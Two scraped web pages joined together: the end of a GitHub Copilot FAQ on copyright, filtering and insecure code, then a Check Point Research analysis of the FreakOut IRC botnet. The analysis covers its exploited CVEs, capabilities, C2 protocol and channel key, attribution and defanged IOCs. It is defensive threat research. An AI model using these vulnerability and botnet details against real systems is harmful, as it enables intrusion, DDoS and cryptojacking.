What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

## Footnotes

1. [Authentication with SAML single sign-on (SSO)](https://docs.github.com/en/enterprise-cloud%40latest/authentication/authenticating-with-saml-single-sign-on/about-authentication-with-saml-single-sign-on) available for organizations using GitHub Enterprise Cloud.

## Site-wide Links

### Subscribe to our developer newsletter

Get tips, technical guides, and best practices. Twice a month. Right in your inbox.

[Subscribe](https://resources.github.com/newsletter/)

### Product

* [Features](/features)
* [Enterprise](/enterprise)
* [Copilot](/features/copilot)
* [Security](/security)
* [Pricing](/pricing)
* [Team](/team)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare)

### Platform

* [Developer API](https://docs.github.com/get-started/exploring-integrations/about-building-integrations)
* [Partners](https://partner.github.com)
* [Education](https://github.com/edu)
* [GitHub CLI](https://cli.github.com)
* [GitHub Desktop](https://desktop.github.com)
* [GitHub Mobile](https://github.com/mobile)

### Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com)
* [Premium Support](/enterprise/premium-support)
* [Skills](https://skills.github.com)
* [Status](https://www.githubstatus.com)
* [Contact GitHub](https://support.github.com?tags=dotcom-footer)

### Company

* [About](https://github.com/about)
* [Customer stories](/customer-stories?type=enterprise)
* [Blog](https://github.blog)
* [The ReadME Project](/readme)
* [Careers](https://github.careers)
* [Newsroom](/newsroom)
* [Inclusion](/about/diversity)
* [Social Impact](https://socialimpact.github.com)
* [Shop](https://shop.github.com)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
  ([Updated 02/2024](https://github.com/github/site-policy/pull/582))
* [Sitemap](/sitemap)
* [What is Git?](/git-guides)
* Manage cookies
* Do not share my personal information

* [GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram
  GitHub on Instagram](https://www.instagram.com/github)
* [GitHub on YouTube](https://www.youtube.com/github)
* [GitHub on X](https://x.com/github)
* [TikTok
  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch
  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub’s organization on GitHub](https://github.com/github)

You can’t perform that action at this time.



=== Content from research.checkpoint.com_4e3cace6_20250115_200922.html ===

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

* [CONTACT US](https://research.checkpoint.com/contact/)
* [DISCLOSURE POLICY](https://research.checkpoint.com/disclosure-policy/)
* [CHECKPOINT.COM](https://www.checkpoint.com/)
* [UNDER ATTACK?](https://www.checkpoint.com/about-us/contact-incident-response/)

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

* [Latest Publications](https://research.checkpoint.com/latest-publications/)
* [CPR Podcast Channel](https://research.checkpoint.com/cpr-podcast-channel/)
* [Web 3.0 Security](https://research.checkpoint.com/category/web3/)
* [Intelligence Reports](https://research.checkpoint.com/intelligence-reports/)
* Resources
  + [ThreatCloud AI](https://www.checkpoint.com/ai/)
  + [Threat Intelligence & Research](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  + [Zero Day Protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  + [Sandblast File Analysis](http://threatemulation.checkpoint.com/)
* [About Us](https://research.checkpoint.com/about-us/)
* [SUBSCRIBE](https://research.checkpoint.com/subscription/)

SUBSCRIBE

## CATEGORIES

* [Android Malware
  23](https://research.checkpoint.com/category/android-malware/)
* [Artificial Intelligence
  4](https://research.checkpoint.com/category/artificial-intelligence-2/)
* [ChatGPT
  3](https://research.checkpoint.com/category/chatgpt/)
* [Check Point Research Publications
  396](https://research.checkpoint.com/category/threat-research/)
* [Cloud Security
  1](https://research.checkpoint.com/category/cloud-security/)
* [CPRadio
  44](https://research.checkpoint.com/category/cpradio/)
* [Crypto
  2](https://research.checkpoint.com/category/crypto/)
* [Data & Threat Intelligence
  1](https://research.checkpoint.com/category/data-threat-intelligence/)
* [Data Analysis
  0](https://research.checkpoint.com/category/data-analysis/)
* [Demos
  22](https://research.checkpoint.com/category/demos/)
* [Global Cyber Attack Reports
  338](https://research.checkpoint.com/category/threat-intelligence-reports/)
* [How To Guides
  13](https://research.checkpoint.com/category/how-to-guides/)
* [Ransomware
  2](https://research.checkpoint.com/category/ransomware/)
* [Russo-Ukrainian War
  1](https://research.checkpoint.com/category/russo-ukrainian-war/)
* [Security Report
  1](https://research.checkpoint.com/category/security-report/)
* [Threat and data analysis
  0](https://research.checkpoint.com/category/threat-and-data-analysis/)
* [Threat Research
  172](https://research.checkpoint.com/category/threat-research-2/)
* [Web 3.0 Security
  9](https://research.checkpoint.com/category/web3/)
* [Wipers
  0](https://research.checkpoint.com/category/wipers/)

![](https://research.checkpoint.com/wp-content/uploads/2021/01/LinuxCVEs_blog_header.jpg)

# FreakOut – Leveraging Newest Vulnerabilities for creating a Botnet

January 19, 2021

https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/

Research By: Omer Ventura, Ori Hamama, Network Research

# Introduction

Recently, Check Point Research encountered several attacks that exploited multiple vulnerabilities, including some that were only recently published, to inject OS commands. The goal behind the attacks was to create an IRC botnet, which can later be used for several purposes, such as DDoS attacks or crypto-mining.

The attacks aim at devices that run one of the following:

* TerraMaster TOS(TerraMaster Operating System) – the operating system used for managing TerraMaster NAS (Network Attached Storage) servers
* Zend Framework –  a collection of packages used in building web application and services using PHP, with more than 570 million installations
* Liferay Portal – a free, open-source enterprise portal. It is a web application platform written in Java that offers features relevant for the development of portals and websites

![Figure1](//research.checkpoint.com/wp-content/uploads/2021/01/Figure1-1.png)

**Figure 1:** The products attacked by the campaign.

Each of the infected devices can be later used as an attacking platform, thus making the attack flow recursive. In a later variant, Xmrig causes the victim’s device to engage in coin-mining.

# FreakOut Infection Chain

![The attack flow of the campaign](//research.checkpoint.com/wp-content/uploads/2021/01/image1.png)

**Figure 2:** The attack flow of the campaign.

The campaign exploits these recent vulnerabilities: CVE-2020-28188, CVE-2021-3007 and CVE-2020-7961. These allow the attacker to upload and execute a Python script on the compromised servers.

### **CVE-2020-28188**

The vulnerability is caused by a lack of input validation in the “event” parameter in the “makecvs” PHP page (/include/makecvs.php). This allows a remote unauthenticated attacker to inject OS commands, and gain control of the servers using TerraMaster TOS (versions prior to  4.2.06).

![The attack exploiting CVE-2020-28188 as seen in the logs.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure3.png)

**Figure 3:** The attack exploiting CVE-2020-28188 as seen in our sensors.

### **CVE-2021-3007**

This vulnerability is caused by the unsecured deserialization of an object. In versions higher than Zend Framework 3.0.0, the attacker abuses the Zend3 feature that loads classes from objects in order to upload and execute malicious code in the server. The code can be uploaded using the “callback” parameter, which in this case inserts a malicious code instead of the “callbackOptions” array.

![The attack exploiting CVE-2021-3007 as seen in the logs.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure4.png)

**Figure 4:** The attack exploiting CVE-2021-3007 as seen in our sesnors.

### **CVE-2020-7961**

The vulnerability is a Java unmarshalling vulnerability via JSONWS in Liferay Portal (in versions prior to 7.2.1 CE GA2). Marshalling, which is similar to serialization, is used for communication with remote objects, in our case with a serialized object. Exploiting the vulnerability lets the attacker provide a malicious object, that when unmarshalled, allows remote code execution.

![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure5.png)

**Figure 5:** The attack exploiting CVE-2020-7961 as seen in our sensors.

In all the attacks involving these CVEs, the attacker’s first move is to try running different syntaxes of OS commands to download and execute a Python script named “out.py”.
After the script is downloaded and given permissions (using the “chmod” command), the attacker tries to run it using Python 2. Python 2 reached EOL (end-of-life) last year, meaning the attacker assumes the victim’s device has this deprecated product installed.

#

# The Python Code – out.py

The malware, downloaded from the site http://gxbrowser[.]net, is an obfuscated Python script consisting of polymorphic code. Many of the function names remain the same in each download, but there are multiple functions that are obfuscated using random strings generated by a packing function. The first attack trying to download the file was observed on January 8, 2021. Since then, hundreds of download requests from the relevant URL were made.

![The __init__ function of the main class of the code “out.py”. The code is obfuscated and encoded with several different functions. Each time it is downloaded, the code is obfuscated anew. differently.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure6.png)

**Figure 6:** The *\_\_init\_\_* function of the main class of the code *“out.py”.* The code is obfuscated and encoded with several different functions. Each time it is downloaded, the code is obfuscated anew. differently.

When we searched for the relevant domain and file in VirusTotal (VT), we found other codes called “out.py”.
These files were uploaded only a few hours before the attacks began, and had low scores of detections by the AVs presented in VirusTotal. All the files originated from the same domain, hxxp://gxbrowser[.]net, as this address is hardcoded in all scripts and is the only address that appears.

![Other codes related to the domain and IP.  Both are Python-based although the second is classified as Java.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure7.png)

**Figure 7:** Other codes related to the domain and IP. Both are Python-based although the second is classified as Java.

When we examined the first variation uploaded to VT (the third one in Fig.7) with our script, and compared the codes and their functions, it seemed to be a slightly earlier version of the code.

![Comparing the different files. They have some similarities in function names and comments that shed some light on the more obfuscated code.](//research.checkpoint.com/wp-content/uploads/2021/01/figure8-with_colors-1.png)

**Figure 8:** Comparing the different files. They have some similarities in function names and comments that shed some light on the more obfuscated code.

The code itself is less obfuscated, includes comments, and seems to be related to our attacker.

![Figure 9: An earlier version of the same function presented in Fig.3. This time it contained developer comments revealing some of the variables’ purposes.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure9.png)

**Figure 9:** An earlier version of the same function presented in Fig.6. This time it contained developer comments revealing some of the variables’ purposes.

In addition, in this version, the attacker left a calling card with relevant information, including the code developer’s name and an update that took place on January 1, 2021. All this information was omitted in the version we studied

![A calling card left in the earlier version of the code](//research.checkpoint.com/wp-content/uploads/2021/01/Figure10.png)

**Figure 10:** A calling card left in the earlier version of the code.

Comparing the two codes and the different comments helped reveal the code communication methods, the capabilities and the threat actor behind it.

# The Malware Capabilities

At this point, the facilities and capabilities of the malware became clearer.

There is a specific function for each of the main capabilities, making the code very modular and easy to change or maintain:

* Port Scanning utility
* Collecting system fingerprint
  + Includes the device address (MAC, IP), and memory information. These are used in different functions of the code for different checks
  + TerraMaster TOS version of the system
* Creating and sending packets
  + ARP poisoning for Man-in-the-Middle attacks.
  + Supports UDP and TCP packets, but also application layer protocols such as HTTP, DNS, SSDP, and SNMP
  + Protocol packing support created by the attacker.
* Brute Force – using hard coded credentials
  + With this list, the malware tries connecting to other network devices using Telnet. The function receives an IP range and tries to brute force each IP with the given credential. If it succeeds, the results of the correct credential are saved to a file, and sent in a message to the C2 server
* Handling sockets
  + Includes handling exceptions of runtime errors.
  + Supports multi-threaded communication to other devices. This allows simultaneous actions the bots can perform while listening to the server
* Sniffing the network
  + Executes using the “ARP poisoning” capability. The bot sets itself as a Man-in-the-Middle to other devices. The intercepted data is sent to the C2 server
* Spreading to different devices, using the “exploit” function.
  + Randomly generates the IPs to attack
  + Exploits the CVEs mentioned above (CVE-2020-7961 , CVE-2020-28188, CVE-2021-3007)
* Gaining persistence by adding itself to the rc.local configuration.
* DDOS and Flooding – HTTP, DNS, SYN
  + Self-implementation of Slowlaris. The malware creates many sockets to a relevant victim address for the purpose of instigating a DDoS attack
* Opening a reverse-shell – shell on the client
* Killing a process by name or ID
* Packing and unpacking the code using obfuscation techniques to provide random names to the different functions and variables

![Part of the function exploit, which is responsible for the spreading attempts. Exploits CVE-2020-7961, CVE-2020-28188 and CVE-2021-3007, after clarification.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure11.png)

**Figure 11:** Part of the function *exploit*, which is responsible for the spreading attempts. Exploits CVE-2020-7961, CVE-2020-28188 and CVE-2021-3007, after clarification.

# The Malware’s Communication

Each infected device is configured to communicate with a hardcoded C2 server. All the connection credentials are obfuscated and encoded in the code itself multiple times, and are generated using multiple functions.

At the initial connection to the server, the conversation begins with the client sending a “NICK message”, which declares the user nickname. The nickname is generated with this format:

**[HAX|**System OS**|**Machine Type**|**CPU count**] **8-12 random letters****

An example of the bot nickname as created by the script:

**[HAX|**Linux**|**x86\_64**|**3**] **QCRjbbnQm****

After declaring the nickname of the client, the client sends the username, which is the nickname plus the IRC address and the string “localhost  :”, followed by the bot nickname. When the server accepts this message, the communication begins.

Following a quick back and forth set of Ping-Pong messages, the server provides the client server information about the channels. Then, one minute later, the client can join channels on the server.

In FreakOut, the relevant channel was “#update” on the server “gxbrowser[.]net”.  The user must provide a channel key, used as a password, to connect to the channel. The key can be extracted from the code, and is equal to the string “N3Wm3W”.

![Communication with the server. Initiates the conversation with the relevant messages.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure12.png)

**Figure 12:** Communication with the server. Initiates the conversation with the relevant messages.

The client can now be used as a part of a botnet campaign and accepts command messages from the server to execute. The commands are sent using a symbols-based communication. Each message sent by the server is parsed and split into different symbols, with each one having a different meaning.

Every message includes the command name (i.e: udpflood, synflood) and the rest of the arguments change accordingly. When the client finishes executing the relevant command as received from C2, it then sends the results in a private message (PRIVMSG IRC command) to the relevant admin in the channel, providing it with relevant details.

![Communication with the server. The server accepts commands in the format mentioned above. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure13.png)

**Figure 13:** Communication with the server. The server accepts commands in the format mentioned above.

#

# The Impact

Based on the malware features, it seems that the attacker can use the compromised systems for further attacks, such as using the system resources for crypto-mining, spreading laterally across the company network, or launching attacks on outside targets while masquerading as the compromised company. We revealed further information about FreakOut when we used the algorithm-created credentials to connect to the server. After logging in, additional server information is provided to the client, including the room’s capacity, the users connected and even operators and unknown connections.

![After logging in, more information is provided about the server.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure14.png)

**Figure 14:** After logging in, more information is provided about the server.

The server was created in late November 2020 and has been running ever since with 300 current users and 5 channels. Exploring the different channels revealed a very active one, called #update. This channel includes 186 exploited devices communicating with the server, as seen in the messages exchanged between the IRC server and the client, and in the channel page:

![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure15a.png)![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure15b.png)

**Figure 15:** The #update channel, as seen in the IRC communication with the malware and in the IRC channel surfed through a web interface.

We observed two additional channels called “opers” (which probably stands for operators as we have seen the server admin there), and “andpwnz”. The network name of the server is called “Keknet”. Due to the fact the file was updated and released in January 2021, we believe this scale was reached in less than a week. Therefore, we can assume that this campaign will ratchet up to higher levels in the near future.

#

# Threat Actors

To identify the threat actors responsible for the attacks, we searched for leads in the internet and social media.  Searching for both the code author, who goes by the name “Freak” (which we have also seen in the IRC server channels) and the IRC bot name “N3Cr0m0rPh”, revealed information about the threat actor behind the campaign.

In a post published on HackForums back in 2015, submitted by the user “Fl0urite” with the title “N3Cr0m0rPh Polymorphic IRC BOT”, the bot is offered for sale in exchange for BitCoins (BTC). This bot seem to have many of the same capabilities as the current one, and the same description as the current bot in the calling card. However, some of the features were omitted over the years, such as the USB worm and the regedit ability.

![The post submitted by “Fl0urite” back in 2015. The name of the IRC bot is the same, with many similar capabilities. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure16.png)

**Figure 16:** The post submitted by “Fl0urite” back in 2015. The name of the IRC bot is the same, with many similar capabilities.

The name “Fl0urite” is mentioned in other hacking forums and GitHub, and is associated with multiple pieces of code which can be found on these sites that resemble the current malware code functions.

As mentioned previously, “Freak@PopulusControl” appears to be the author of  the latest code version. When we searched for these strings, we found several results, including an earlier version of the malware code (V6). In this version, however, the author left a comment, explaining the code is a free tool and that redistribution is allowed.

![V6](//research.checkpoint.com/wp-content/uploads/2021/01/1.png)

**Figure 17:** Version 6 of the code.

As mentioned previously,  the admin in the IRC channel is also called “Freak.”

![The user “Freak” joins and leaves the #update channel on the server. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure18.png)

**Figure 18:** The user “Freak” joins and leaves the #update channel on the server.

In early 2015 codes found on Pastebin , that were uploaded by the user “Keksec”, there seems to be a link between the two identities “Fl0urite” and “Freak” in several files. In addition, there is a link to the user “Fl0urite” on HackForums in these files signed by “Freak.” The other files uploaded by the user are signed with the exact string “Freak@PopulusControl (aka sudoer)” that seems to be associated with the malware functions as well. Based on this evidence, we conclude that both identities belong to the same person.

In the Pastebin, there are also files that were uploaded recently (January 12, 2021).

![Files uploaded to Pastebin.  The author presents himself as Freak/Fl0urite. The address is related to the user “Fl0urite” in HackForums, while later files uploaded are signed only with “Freak@PopulousControl.”](//research.checkpoint.com/wp-content/uploads/2021/01/Figure1920.png)

**Figure 19-20:** Files uploaded to Pastebin. The author presents himself as Freak/Fl0urite. The address is related to the user “Fl0urite” in Hack Forums, while later files uploaded are signed only with “Freak@PopulousControl.”

The URL of the site gxbrowser[.]net reveals the following page:

![The index page of gxbrowser[.]net](//research.checkpoint.com/wp-content/uploads/2021/01/Figure21.png)

**Figure 21:** The index page of gxbrowser[.]net

The page has the names “keksec” and “Freak” which were observed in the Pastebin files, and is also associated with the name “Keknet” seen in the IRC server.

Currently, it seems that “Freak” is using it to create a botnet.

On VT, and on the relevant Pastebin mentioned previously, there are other files related to the domain such as Crypto-mining malwares. In the latest code downloaded (January 12, 2021), it seems that the malware tries to exploit the vulnerabilities to install the Xmrig from the server hxxp://gxbrowser[.]net.

![Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure22.png)

**Figure 22:** The file xmrig1 on the server gxbrowser[.]net

![Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure23.png)

**Figure 23:** Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.

#

# Conclusion

FreakOut is an attack campaign that utilizes three vulnerabilities, including some newly released, to compromise different servers. The threat actor behind the attack, named “Freak”, managed to infect many devices in a short period of time, and incorporated them into a botnet, which in turn is used for DDoS attacks and crypto-mining. Such attack campaigns highlight the importance of taking sufficient precautions and updating your security protections on a regular basis. As we have observed, this is an ongoing campaign that can spread rapidly.

# MITRE ATT&CK TECHNIQUES

| [**Initial Access**](https://attack.mitre.org/tactics/TA0001) | [**Resource Development**](https://attack.mitre.org/tactics/TA0011/) | [**Execution**](https://attack.mitre.org/tactics/TA0002) | [**Persistence**](https://attack.mitre.org/tactics/TA0003) | [**Privilege Escalation**](https://attack.mitre.org/tactics/TA0004) | [**Defense Evasion**](https://attack.mitre.org/tactics/TA0005) | [**Credential Access**](https://attack.mitre.org/tactics/TA0006) | [**Discovery**](https://attack.mitre.org/tactics/TA0007/) | [**Lateral Movement**](https://attack.mitre.org/tactics/TA0008) | [**Collection**](https://attack.mitre.org/tactics/TA0009) | [**Command and Control**](https://attack.mitre.org/tactics/TA0011/) | [**Exfiltration**](https://attack.mitre.org/tactics/TA0010) | [**Impact**](https://attack.mitre.org/tactics/TA0040) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Exploit Public-Facing Application (T1190) | Acquire infrastructure: Domains (T1583/003) | Exploitation for Client Execution (T1203) | Event Triggered Execution: .bash\_profile and .bashrc (T1546/004) | Event Triggered Execution: .bash\_profile and .bashrc (T1546/004) | Deobfuscate/Decode Files or Information (T1140) | Brute Force (T1110) | Network Service Scanning (T1046) | Remote Services (T1021) | Network Sniffing (T1040) | Application Layer Protocol (T1071) | Exfiltration over C2 Channel (T1041) | Network Denial of Service Direct Network Flood (T1498/001) |
|  | Compromise Infrastructure: Botnet (T1584/005) | Command and Scripting Interpreter (T1059) |  |  | File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification (T1222/002) | Man-in-the-Middle: ARP Cache Poisoning (T1557/002) |  | Exploitation of Remote Services (T1210) | Data Staged: Local Data Staging (T1074/001) | Application Layer Protocol: Web Protocols (T1071/001) |  | Network Denial of Service Reflection Amplification (T1498/002) |
|  |  | Command and Scripting Interpreter: Python (T1059/006) |  |  |  |  |  |  |  | Application Layer Protocol: DNS (T1071/004) |  | Resource Hijacking (T1496) |
|  |  | Command and Scripting Interpreter: Unix Shell (T1059/004) |  |  |  |  |  |  |  | Data encoding (T1132) |  |  |
|  |  |  |  |  |  | ```   ``` | ```   ``` | ```   ``` | ```   ``` | Data Obfuscation (T1001) | ```   ``` | ```   ``` |

# Protections

Check Point customers are protected by these protections:

#### IPS

* TerraMaster TOS Command Injection (CVE-2020-28188).
* Liferay Portal Insecure Deserialization (CVE-2020-7961).
* Zend Framework Remote Code Execution (CVE-2021-3007).
* CMD Injection Over HTTP

#### Anti-Bot

* Win32.IRC.G
* N3Cr0m0rPh.TC.a
* Win32.N3Cr0m0rPh.TC.a
* Win32.N3Cr0m0rPh.TC.b
* Win32.N3Cr0m0rPh.TC.c
* Win32.N3Cr0m0rPh.TC.d

#

# IOCs

* hxxp://gxbrowser[.]net
* 7c7273d0ac2aaba3116c3021530c1c868dc848b6fdd2aafa1deecac216131779 – out.py (less obfuscated)
* 05908f2a1325c130e3a877a32dfdf1c9596d156d031d0eaa54473fe342206a65 – out.py (more obfuscated)
* ac4f2e74a7b90b772afb920f10b789415355451c79b3ed359ccad1976c1857a8 – out.py (including the xmrig1 installation)
* ac6818140883e0f8bf5cef9b5f965861ff64cebfe181ff025e1f0aee9c72506cOut – xmrig1

# References

* https://kiwiirc.com/

[![](https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg)

GO UP](#single-post)

[BACK TO ALL POSTS](/latest-publications/)

## POPULAR POSTS

[![](https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg)](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

* Artificial Intelligence
* ChatGPT
* Check Point Research Publications

[OPWNAI : Cybercriminals Starting to Use ChatGPT](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

[![](https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg)](https://research.checkpoint.com/2019/hacking-fortnite/)

* Check Point Research Publications
* Threat Research

[Hacking Fortnite Accounts](https://research.checkpoint.com/2019/hacking-fortnite/)

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg)](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

* Artificial Intelligence
* ChatGPT
* Check Point Research Publications

[OpwnAI: AI That Can Save the Day or HACK it Away](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

### BLOGS AND PUBLICATIONS

[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

* Check Point Research Publications
* Global Cyber Attack Reports
* Threat Research

February 17, 2020
### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

* Check Point Research Publications

August 11, 2017
### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

